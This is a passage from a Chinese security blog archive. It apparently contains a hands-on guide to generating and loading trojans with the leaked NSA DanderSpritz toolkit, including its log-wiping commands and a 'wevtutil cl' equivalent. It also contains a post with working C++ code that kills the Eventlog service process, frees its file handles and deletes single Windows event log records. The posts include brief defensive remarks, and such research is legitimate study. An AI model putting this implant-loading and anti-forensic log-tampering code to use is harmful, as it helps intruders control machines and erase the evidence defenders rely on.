<p>http://blacksunhackers.club/2016/08/post-exploitation-persistence-with-application-shims-intro/</p>

<p>https://www.blackhat.com/docs/asia-14/materials/Erickson/Asia-14-Erickson-Persist-It-Using-And-Abusing-Microsofts-Fix-It-Patches.pdf</p>

<p>http://www.irongeek.com/i.php?page=videos/derbycon3/4206-windows-0wn3d-by-default-mark-baggett</p>

<p>http://sdb.io/erickson-codeblue.pdf</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on October 19, 2016
  </div>

  
</article><article class="post">
  <h1>NSA DanderSpiritz测试指南——木马生成与测试</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>DanderSpritz是NSA的一款界面化的远控工具，基于FuzzBunch框架，执行Start.jar即可启动</p>

<p>在实际测试过程中，由于缺少说明文档，遇到的问题有很多，同时一些细节也值得深入研究</p>

<p>所以本文将要帮助大家答疑解惑，分享测试心得，结合木马特点分析防御思路</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>执行pc_prep无法获得回显的原因及解决方法</li>
  <li>Pc同Pc2.2的区别</li>
  <li>level3和level4木马代表的含义及如何使用</li>
  <li>各类型木马区别</li>
  <li>dll木马利用方式</li>
  <li>Windows单条日志删除功能</li>
  <li>木马查杀思路</li>
</ul>

<h2 id="0x02-实际测试">0x02 实际测试</h2>
<hr>

<p>测试环境：</p>

<ul>
  <li>Win7 x86</li>
</ul>

<p>安装如下工具：</p>

<ul>
  <li>python2.6</li>
  <li>pywin32</li>
  <li>jdk</li>
</ul>

<h3 id="1下载fuzzbunch">1、下载fuzzbunch</h3>

<p><strong>参考链接：</strong></p>

<p>https://github.com/3gstudent/fuzzbunch</p>

<p><strong>注：</strong></p>

<p>我fork了公开的fuzzbunch项目(https://github.com/fuzzbunch/fuzzbunch)，并添加了部分内容，解决了一个bug，具体内容会在后面介绍</p>

<h3 id="2直接运行startjar">2、直接运行Start.jar</h3>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-26/2-1.png" alt="Alt text"></p>

<p>设置启动参数，Log Directory需要设置成固定格式：c:\logs\xxx(xxx任意名称)</p>

<p>否则，会出现报错，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-26/2-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>网上的部分分析文章认为应该先用fb.py生成一个日志文件，接着Start.jar指向该目录，其实不需要，只要路径格式正确即可</p>

<h3 id="3执行pc_prep配置木马">3、执行pc_prep配置木马</h3>

<p>输入pc_prep获得回显，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-26/2-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>有很多人在测试的时候发现输入pc_prep无法获得回显，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-26/2-4.png" alt="Alt text"></p>

<p><strong>原因：</strong></p>

<p>fuzzbunch工程下载自如下链接：</p>

<p>https://github.com/x0rz/EQGRP_Lost_in_Translation</p>

<p>文件缺失，导致该错误</p>

<p><strong>正确的下载位置：</strong></p>

<p>https://github.com/fuzzbunch/fuzzbunch</p>

<p>但是，下载后还需要补全缺失的文件，才能完全正常使用</p>

<p>我fork了上述工程，并补全了缺失文件，下载我的github即可解决上述问题，地址如下：</p>

<p>https://github.com/3gstudent/fuzzbunch</p>

<p><strong>补充：</strong></p>

<p>在之前的测试过程中，使用了存在bug的版本，虽然<code class="language-plaintext highlighter-rouge">pc_prep</code>无法获得回显，但是使用<code class="language-plaintext highlighter-rouge">pc2.2_prep</code>可以生成木马</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-26/2-5.png" alt="Alt text"></p>

<p>可是木马无法回连</p>

<p><strong>猜测原因：</strong></p>

<p>pc相对于Pc2.2版本更高，低版本已经不再使用</p>

<p>查看<code class="language-plaintext highlighter-rouge">\Resources\Pc2.2\Version.xml</code>，显示：<code class="language-plaintext highlighter-rouge">PeddleCheap 2.2.0.2</code></p>

<p>表示Pc2.2对应的PeddleCheap版本为2.2.0.2</p>

<p>查看<code class="language-plaintext highlighter-rouge">\Resources\Pc\Version.xml</code>，显示：<code class="language-plaintext highlighter-rouge">PeddleCheap 2.3.0</code></p>

<p>表示Pc对应的PeddleCheap版本为2.3.0</p>

<p><strong>注：</strong></p>

<p>PeddleCheap用来操作同木马通信，在DanderSpritz主面板显示</p>

<h3 id="4木马分类">4、木马分类</h3>

<p>可选择的木马类型如下：</p>

<ul>
  <li>1) - Standard TCP (i386-winnt Level3 sharedlib)</li>
  <li>2) - HTTP Proxy (i386-winnt Level3 sharedlib)</li>
  <li>3) - Standard TCP (i386-winnt Level3 exe)</li>
  <li>4) - HTTP Proxy (i386-winnt Level3 exe)</li>
  <li>5) - Standard TCP (x64-winnt Level3 sharedlib)</li>
  <li>6) - HTTP Proxy (x64-winnt Level3 sharedlib)</li>
  <li>7) - Standard TCP (x64-winnt Level3 exe)</li>
  <li>8) - HTTP Proxy (x64-winnt Level3 exe)</li>
  <li>9) - Standard TCP Generic (i386-winnt Level4 sharedlib)</li>
  <li>10) - HTTP Proxy Generic (i386-winnt Level4 sharedlib)</li>
  <li>11) - Standard TCP AppCompat-enabled (i386-winnt Level4 sharedlib)</li>
  <li>12) - HTTP Proxy AppCompat-enabled (i386-winnt Level4 sharedlib)</li>
  <li>13) - Standard TCP UtilityBurst-enabled (i386-winnt Level4 sharedlib)</li>
  <li>14) - HTTP Proxy UtilityBurst-enabled (i386-winnt Level4 sharedlib)</li>
  <li>15) - Standard TCP WinsockHelperApi-enabled (i386-winnt Level4 sharedlib)</li>
  <li>16) - HTTP Proxy WinsockHelperApi-enabled (i386-winnt Level4 sharedlib)</li>
  <li>17) - Standard TCP (i386-winnt Level4 exe)</li>
  <li>18) - HTTP Proxy (i386-winnt Level4 exe)</li>
  <li>19) - Standard TCP (x64-winnt Level4 sharedlib)</li>
  <li>20) - HTTP Proxy (x64-winnt Level4 sharedlib)</li>
  <li>21) - Standard TCP AppCompat-enabled (x64-winnt Level4 sharedlib)</li>
  <li>22) - HTTP Proxy AppCompat-enabled (x64-winnt Level4 sharedlib)</li>
  <li>23) - Standard TCP WinsockHelperApi-enabled (x64-winnt Level4 sharedlib)</li>
  <li>24) - HTTP Proxy WinsockHelperApi-enabled (x64-winnt Level4 sharedlib)</li>
  <li>25) - Standard TCP (x64-winnt Level4 exe)</li>
  <li>26) - HTTP Proxy (x64-winnt Level4 exe)</li>
</ul>

<p>按平台区分：</p>

<ul>
  <li>x86</li>
  <li>x64</li>
</ul>

<p>按文件格式区分：</p>

<ul>
  <li>exe</li>
  <li>dll</li>
</ul>

<p>按通信协议区分:</p>

<ul>
  <li>Standard TCP</li>
  <li>HTTP Proxy</li>
</ul>

<p>按功能区分：</p>

<ul>
  <li>Standard</li>
  <li>AppCompat-enabled</li>
  <li>UtilityBurst-enabled</li>
  <li>WinsockHelperApi-enabled</li>
</ul>

<p>按Level区分：</p>

<ul>
  <li>Level3</li>
  <li>Level4</li>
</ul>

<p><strong>注：</strong></p>

<p>经实际测试，Level代表回连方式</p>

<p>level3表示反向连接，控制端监听端口，等待回连</p>

<p>leve4表示正向连接，目标主机监听端口，等待控制端主动连接</p>

<h3 id="5木马测试">5、木马测试</h3>

<p>选择代表性的进行测试</p>

<p><strong>(1)</strong> Level3，选择 3) - Standard TCP (i386-winnt Level3 exe)</p>

<ul>
  <li>按配置生成exe(此处不具体介绍，参照其他文章)</li>
  <li>DanderSpiritz控制端选择PeddleCheap-Listen-Start Listening</li>
  <li>在目标主机直接执行exe</li>
  <li>等待回连</li>
</ul>

<p>操作同正常的反向连接木马</p>

<p><strong>注：</strong></p>

<p>日志文件下生成2个文件<code class="language-plaintext highlighter-rouge">PC_Level3_exe.base</code>和<code class="language-plaintext highlighter-rouge">PC_Level3_exe.configured</code></p>

<p>PC_Level3_exe.base为模板文件，来自于<code class="language-plaintext highlighter-rouge">\Resources\Pc\Level3\i386-winnt\release</code></p>

<p>PC_Level3_exe.configured为加入配置参数的文件</p>

<p>两个文件大小相同，但在特定位置存在差异，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-26/2-6.png" alt="Alt text"></p>

<p><strong>(2)</strong>  Level3，选择 6) - HTTP Proxy (x64-winnt Level3 sharedlib)</p>

<p>按配置生成PC_Level3_http_dll.configured(此处不具体介绍，参照其他文章)</p>

<p>加载方式：</p>

<p>1.利用DoublePulsar加载dll</p>

<p>(此处不具体介绍，参照其他文章)</p>

<p>2.手动加载dll</p>

<p>使用dumpbin查看dll的导出函数，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-26/2-7.png" alt="Alt text"></p>

<p>ordinal为1对应的dll导出函数名为rst32</p>

<p>也就是说，我们可以尝试通过rundll32直接加载该dll</p>

<p>命令行代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">rundll32 PC_Level3_http_dll.configured,rst32</code></p>

<p>木马正常回连</p>

<p><strong>注：</strong></p>

<p>对于http协议的木马，记得设置listen协议的时候要选择http</p>

<p><strong>(3)</strong> Level4，选择 17) - Standard TCP (i386-winnt Level4 exe)</p>

<p>按配置生成PC_Level4_exe.configured(可使用高级模式，指定固定监听端口)</p>

<p>启动exe后执行netstat -ano可看到开启了固定端口</p>

<p>DanderSpiritz控制端选择PeddleCheap-Connect，选择ip，填入Level 4对应的端口</p>

<p>正向连接</p>

<p><strong>(4)</strong> Level4，选择 9) - Standard TCP Generic (i386-winnt Level4 sharedlib)</p>

<p>按配置生成PC_Level4_dll.configured(可使用高级模式，指定固定监听端口)</p>

<p>查看其导出函数，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-26/3-1.png" alt="Alt text"></p>

<p>也就是说，不支持直接通过rundll32加载</p>

<p><strong>猜测：</strong></p>

<p>Level4的木马要一直运行在后台，考虑到隐蔽性，所以不支持该功能</p>

<p>给出一种dll加载的测试方法：通过APC注入</p>

<p>如下图，成功加载，打开监听端口</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-26/2-8.png" alt="Alt text"></p>

<p><strong>参考代码：</strong></p>

<p>https://github.com/3gstudent/Inject-dll-by-APC/blob/master/test.cpp</p>

<p><strong>注：</strong></p>

<p>被注入的程序需要管理员权限，否则会因为权限问题无法打开监听端口</p>

<p>给出另一种dll加载的测试方法：通过Application Compatibility Shims</p>

<p>可参考以下链接：</p>

<p>https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/</p>

<p>如下图，成功加载，打开监听端口</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-26/2-9.png" alt="Alt text"></p>

<p><strong>(5)</strong> Level4，选择 11) - Standard TCP AppCompat-enabled (i386-winnt Level4 sharedlib)</p>

<p>根据字面意思，猜测是支持Application Compatibility Shims</p>

<p>比较Generic和AppCompat-enabled的区别：</p>

<p>二者大小一样，就是AppCompat-enabled多了一个导出函数GetHookAPIs</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-26/3-2.png" alt="Alt text"></p>

<h2 id="0x03-木马功能">0x03 木马功能</h2>
<hr>

<p>木马连接成功后，自动开始信息搜集，返回各种详细信息</p>

<p>比较人性化的设计是会自动询问用户是否提权</p>

<p>在检测到环境安全后会询问用户是否需要导出hash</p>

<p>待信息搜集完成后，输入help可获得支持的操作</p>

<p><strong>注：</strong></p>

<p>help获得的内容不完整，输入aliases可获得更多操作命令介绍</p>

<p>help+命令可获得具体命令的操作介绍</p>

<p>例如，输入help eventlogedit，回显如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-26/3-3.png" alt="Alt text"></p>

<h3 id="1日志操作功能">1、日志操作功能</h3>

<p>关于日志操作的命令如下：</p>

<ul>
  <li>eventlogclear</li>
  <li>eventlogedit</li>
  <li>eventlogfilter</li>
  <li>eventlogquery</li>
</ul>

<p><strong>具体功能如下：</strong></p>

<p><strong>eventlogquery：</strong></p>

<p>统计日志列表，查询所有日志信息，包含时间，数目</p>

<p>可查询指定类别的日志信息，包含时间，数目，命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">eventlogquery -log Setup</code></p>

<p>该操作等价于</p>

<p><code class="language-plaintext highlighter-rouge">wevtutil.exe gli setup</code></p>

<p><strong>注：</strong></p>

<p>wevtutil.exe操作系统默认包含</p>

<p><strong>eventlogfilter：</strong></p>

<p>查看指定类别的日志内容</p>

<p>命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">eventlogfilter -log Setup -num 19</code></p>

<p>该操作等价于</p>

<p><code class="language-plaintext highlighter-rouge">wevtutil qe /f:text setup</code></p>

<p><strong>eventlogedit：</strong></p>

<p>删除单条日志</p>

<p>可删除单条日志内容，命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">eventlogedit -log Setup -record 1</code></p>

<p><strong>注：</strong>
record序号可通过eventlogfilter获得</p>

<p>该命令暂没有公开工具支持</p>

<p><strong>eventlogclear：</strong></p>

<p>删除该类日志所有内容</p>

<p>命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">eventlogclear -log Microsoft-Windows-Dhcpv6-Client/Admin</code></p>

<p>该操作等价于</p>

<p><code class="language-plaintext highlighter-rouge">wevtutil cl Microsoft-Windows-Dhcpv6-Client/Admin</code></p>

<h2 id="0x04-木马查杀思路">0x04 木马查杀思路</h2>
<hr>

<p>DanderSpritz的木马生成方式如下：</p>

<p>文件夹\Resources\Pc\Level3和\Resources\Pc\Level4下保存模板文件，固定位置预留参数配置信息，实际生成时向模板文件写入配置信息</p>

<p>目前杀毒软件已经对这些模板文件成功识别并查杀，同时，这些模板文件的代码并没有开源，也会提高在恶意利用上面的门槛</p>

<p>建议普通用户：</p>

<ul>
  <li>更新系统补丁</li>
  <li>更新杀毒软件病毒库</li>
</ul>

<p>就能够防范该工具的攻击</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文分享了DanderSpiritz的测试心得，希望能够帮助大家在技术研究上对其有更好的认识，省略了部分具体利用细节和章节，以防该工具被滥用</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on April 26, 2017
  </div>

  
</article><article class="post">
  <h1>Windows XML Event Log (EVTX)单条日志清除（三）——通过解除文件占用删除当前系统单条日志记录</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Windows XML Event Log (EVTX)单条日志清除系列文章的第三篇，介绍第一种删除当前系统evtx日志文件单条日志记录的方法：关闭服务对应的进程，释放文件句柄，解除文件占用，删除日志，重启服务</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>通过c程序枚举服务信息，提取Eventlog服务对应进程svchost.exe的pid</li>
  <li>通过c程序提权关闭Eventlog进程</li>
  <li>通过c程序释放文件句柄</li>
  <li>通过c程序删除单条日志文件</li>
</ul>

<h2 id="0x02-删除思路">0x02 删除思路</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%8C-%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0%E5%88%A0%E9%99%A4evtx%E6%96%87%E4%BB%B6%E7%9A%84%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">《Windows XML Event Log (EVTX)单条日志清除（二）——程序实现删除evtx文件的单条日志记录》</a>介绍了删除单条日志记录的方法，但如果直接用来删除当前系统的日志，在打开文件时会报错，提示文件被占用</p>

<p>这是因为当前系统启动日志服务Eventlog后，会以独占模式打开日志文件，导致其他进程无法打开该日志文件，也就无法进行修改操作</p>

<p>有以下两种解决方法：</p>

<ol>
  <li>
    <p>结束日志服务Eventlog对应的进程，释放文件句柄，获得修改日志文件的权限</p>
  </li>
  <li>
    <p>获得日志服务Eventlog对应进程中指定日志文件的句柄，利用该句柄实现日志文件的修改</p>
  </li>
</ol>

<p>本文将要介绍第一种解决方法，分享在程序实现上的细节，最后开源实现代码</p>

<p>第二种解决方法会在之后的文章进行详细介绍</p>

<h2 id="0x03-获得eventlog服务对应进程svchostexe的pid">0x03 获得Eventlog服务对应进程svchost.exe的pid</h2>
<hr>

<p>由于Windows系统有多个svchost.exe进程，无法直接搜索进程名”svchost.exe”获得Eventlog服务对应的进程pid</p>

<p>查询思路：</p>

<p>枚举当前系统服务，根据服务名称筛选出对应的进程pid</p>

<h3 id="1通过powershell实现">1、通过powershell实现</h3>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
</code></pre></div></div>

<h3 id="2通过c实现">2、通过c++实现</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
#pragma comment(lib,"Advapi32.lib") 
DWORD  getpid()
{
	DWORD PID = 0;
	SC_HANDLE scHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (scHandle == NULL)
	{
		printf("[!]OpenSCManager fail(%ld)", GetLastError());
	}
	else
	{
		SC_ENUM_TYPE infoLevel = SC_ENUM_PROCESS_INFO;
		DWORD dwServiceType = SERVICE_WIN32;
		DWORD dwServiceState = SERVICE_STATE_ALL;
		LPBYTE lpServices = NULL;
		DWORD cbBufSize = 0;
		DWORD pcbBytesNeeded;
		DWORD servicesReturned;
		LPDWORD lpResumeHandle = NULL;
		LPCSTR pszGroupName = NULL;
		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &amp;pcbBytesNeeded, &amp;servicesReturned, lpResumeHandle, pszGroupName);
		cbBufSize = pcbBytesNeeded;
		lpServices = new BYTE[cbBufSize];
		if (NULL == lpServices)
		{
			printf("[!]lpServices = new BYTE[%ld] -&gt; fail(%ld)\n", cbBufSize, GetLastError());
		}
		else
		{
			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &amp;pcbBytesNeeded, &amp;servicesReturned, lpResumeHandle, pszGroupName);
			LPENUM_SERVICE_STATUS_PROCESS lpServiceStatusProcess = (LPENUM_SERVICE_STATUS_PROCESS)lpServices;
			for (DWORD i = 0; i &lt; servicesReturned; i++)
			{
				_strlwr_s(lpServiceStatusProcess[i].lpServiceName, strlen(lpServiceStatusProcess[i].lpServiceName) + 1);
				if (strstr(lpServiceStatusProcess[i].lpServiceName, "eventlog") != 0)
				{
					printf("[+]ServiceName:%s\n", lpServiceStatusProcess[i].lpServiceName);
					printf("[+]PID:%ld\n", lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId);
					PID = lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId;
				}
			}
			delete[] lpServices;
		}
		CloseServiceHandle(scHandle);
	}
	if (PID == 0)
		printf("[!]Get EventLog's PID error\n");

	return PID;
}

int main(int argc, char *argv[])
{
	DWORD pid = getpid();
	return 0;
}
</code></pre></div></div>

<h2 id="0x04-提权关闭eventlog进程">0x04 提权关闭Eventlog进程</h2>
<hr>

<h3 id="1通过powershell实现-1">1、通过powershell实现</h3>

<p>执行cmd命令taskkill即可</p>

<h3 id="2通过c实现-1">2、通过c++实现</h3>

<p>c++的代码需要提升权限才能结束进程svchost.exe</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;

#pragma comment(lib,"Advapi32.lib") 

BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}

DWORD  getpid()
{
	DWORD PID = 0;
	SC_HANDLE scHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (scHandle == NULL)
	{
		printf("[!]OpenSCManager fail(%ld)", GetLastError());
	}
	else
	{
		SC_ENUM_TYPE infoLevel = SC_ENUM_PROCESS_INFO;
		DWORD dwServiceType = SERVICE_WIN32;
		DWORD dwServiceState = SERVICE_STATE_ALL;
		LPBYTE lpServices = NULL;
		DWORD cbBufSize = 0;
		DWORD pcbBytesNeeded;
		DWORD servicesReturned;
		LPDWORD lpResumeHandle = NULL;
		LPCSTR pszGroupName = NULL;
		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &amp;pcbBytesNeeded, &amp;servicesReturned, lpResumeHandle, pszGroupName);
		cbBufSize = pcbBytesNeeded;
		lpServices = new BYTE[cbBufSize];
		if (NULL == lpServices)
		{
			printf("[!]lpServices = new BYTE[%ld] -&gt; fail(%ld)\n", cbBufSize, GetLastError());
		}
		else
		{
			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &amp;pcbBytesNeeded, &amp;servicesReturned, lpResumeHandle, pszGroupName);
			LPENUM_SERVICE_STATUS_PROCESS lpServiceStatusProcess = (LPENUM_SERVICE_STATUS_PROCESS)lpServices;
			for (DWORD i = 0; i &lt; servicesReturned; i++)
			{
				_strlwr_s(lpServiceStatusProcess[i].lpServiceName, strlen(lpServiceStatusProcess[i].lpServiceName) + 1);
				if (strstr(lpServiceStatusProcess[i].lpServiceName, "eventlog") != 0)
				{
					printf("[+]ServiceName:%s\n", lpServiceStatusProcess[i].lpServiceName);
					printf("[+]PID:%ld\n", lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId);
					PID = lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId;
				}
			}
			delete[] lpServices;
		}
		CloseServiceHandle(scHandle);
	}

	return PID;
}

int main(int argc, char *argv[])
{

	DWORD pid = getpid();
	if (pid == 0)
	{
		printf("[!]Get EventLog's PID error\n");
		return -1;
	}

	printf("[+]Try to EnableDebugPrivilege... ");
	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.&lt;%d&gt;\n", GetLastError());
		return -1;
	}
	printf("Done\n");

	printf("[+]Try to OpenProcess... ");
	HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (processHandle == NULL)
	{
		printf("Error\n");
		return -1;
	}
	printf("Done\n");

	printf("[+]Try to TerminateProcess... ");
	BOOL bResult = TerminateProcess(processHandle, 0);
	if (bResult == NULL)
	{
		printf("[!]Error\n");
		return -1;
	}
	printf("Done\n");

	return 0;
}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>结束Eventlog服务对应的进程后，隔一段时间后Eventlog服务会自动重启</p>

<h2 id="0x05-释放文件句柄">0x05 释放文件句柄</h2>
<hr>

<p>结束Eventlog服务对应的进程后，还需要释放日志文件的句柄，才能够获得文件的修改权限</p>

<p><strong>实现思路：</strong></p>

<p>1.利用NtQuerySystemInformation查询SystemHandleInformation获得所有进程的句柄信息
2.挑选出日志进程中的所有句柄
3.释放句柄</p>

<p>关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL CloseFileHandle(LPWSTR buf1, DWORD pid)
{
	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize = 0x10000;
	HANDLE processHandle = NULL;
	ULONG i;
	DWORD ErrorPID = 0;
	SYSTEM_HANDLE handle = { 0 };

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQuerySystemInformation");
	if (!NtQuerySystemInformation)
	{
		printf("[!]Could not find NtQuerySystemInformation entry point in NTDLL.DLL");
		return 0;
	}
	_NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtDuplicateObject");
	if (!NtDuplicateObject)
	{
		printf("[!]Could not find NtDuplicateObject entry point in NTDLL.DLL");
		return 0;
	}
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQueryObject");
	if (!NtQueryObject)
	{
		printf("[!]Could not find NtQueryObject entry point in NTDLL.DLL");
		return 0;
	}

	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	if (!NT_SUCCESS(status))
	{
		printf("[!]NtQuerySystemInformation failed!\n");
		return 0;
	}

	UNICODE_STRING objectName;
	ULONG returnLength;
	for (i = 0; i &lt; handleInfo-&gt;HandleCount; i++)
	{
		handle = handleInfo-&gt;Handles[i];
		HANDLE dupHandle = NULL;
		POBJECT_TYPE_INFORMATION objectTypeInfo = NULL;
		PVOID objectNameInfo = NULL;

		if (handle.ProcessId != pid)
		{
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			continue;
		}

		if (handle.ProcessId == ErrorPID)
		{
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			continue;
		}

		if (!(processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handle.ProcessId)))
		{
			printf("[!]Could not open PID %d!\n", handle.ProcessId);
			ErrorPID = handle.ProcessId;
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}

		if (!NT_SUCCESS(NtDuplicateObject(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &amp;dupHandle, 0, 0, 0)))
		{
			//			printf("[%#x] Error!\n", handle.Handle);
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}
		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectTypeInformation, objectTypeInfo, 0x1000, NULL)))
		{
			//			printf("[%#x] Error!\n", handle.Handle);
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}
		objectNameInfo = malloc(0x1000);

		if (IsBlockingHandle(dupHandle) == TRUE) //filter out the object which NtQueryObject could hang on
		{
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}
		CloseHandle(dupHandle);
	}
	free(handleInfo);

	return TRUE;
}
</code></pre></div></div>

<h2 id="0x06-修改日志文件删除日志记录">0x06 修改日志文件，删除日志记录</h2>
<hr>

<p>结束Eventlog服务对应的进程后，获得了操作日志文件的权限，修改日志文件的方法和c代码可参考上一篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%8C-%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0%E5%88%A0%E9%99%A4evtx%E6%96%87%E4%BB%B6%E7%9A%84%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">《Windows XML Event Log (EVTX)单条日志清除（二）——程序实现删除evtx文件的单条日志记录》</a></p>

<p>代码参考地址：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/DeleteRecordbyTerminateProcess.cpp</p>

<p>代码实现了自动获得日志服务的进程，结束进程，释放句柄，修改指定的系统日志文件内容，修改成功后重新启动日志服务</p>

<p>程序测试如图：</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-7-5/1-1.png" alt="Alt text"></p>

<h3 id="更新2018729">更新(2018.7.29)</h3>

<p>在github上看到了另外一种实现思路，地址如下：</p>

<p>https://github.com/360-A-Team/EventCleaner/blob/master/EventCleaner/</p>

<p>值得注意的是日志删除使用了WinAPI EvtExportLog</p>

<p>利用EvtExportLog对日志文件进行过滤，过滤条件为去除某一条日志，这样新生成的文件就是删除单条日志后的文件</p>

<p>优点是不用考虑日志删除的细节，文件格式不会出错，方便高效，并且修改过滤条件可以很容易删除一段时间内的日志</p>

<p>但是存在一点不足：</p>

<p>对于删除日志的后续日志，没有更新EventRecordID</p>

<p>举个简单例子：</p>

<p>Security.evtx下面有10条日志，EventRecordID为1-10，通过EvtExportLog删除第8条日志，第9和第10条日志的EventRecordID不变，仍然为9和10，但是删除后的日志总数为9，EventRecordID依次为1-7，9，10</p>

